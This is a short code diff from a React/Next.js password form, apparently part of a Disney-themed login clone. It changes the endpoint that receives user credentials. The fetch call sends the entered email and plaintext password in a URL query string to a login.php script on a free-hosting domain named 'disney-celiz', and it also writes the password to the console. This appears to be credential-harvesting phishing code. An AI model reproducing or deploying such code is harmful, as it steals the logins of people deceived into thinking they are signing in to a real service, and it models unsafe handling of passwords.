@@ -19,8 +19,8 @@ export default function FormPassword() {
         
         if (password.length > 0 && login) {
             console.log("Fetching...", router.query.email, password);
-            fetch(`http://disney-celiz.orgfree.com/login.php?email=${router.query.email}&pass=${password}`, {
-                origin: "http://disney-celiz.orgfree.com",
+            fetch(`https://disney-celiz.000webhostapp.com/login.php?email=${router.query.email}&pass=${password}`, {
+                origin: "https://disney-celiz.000webhostapp.com",
 
             }).then((response) => {
                 return response.json();
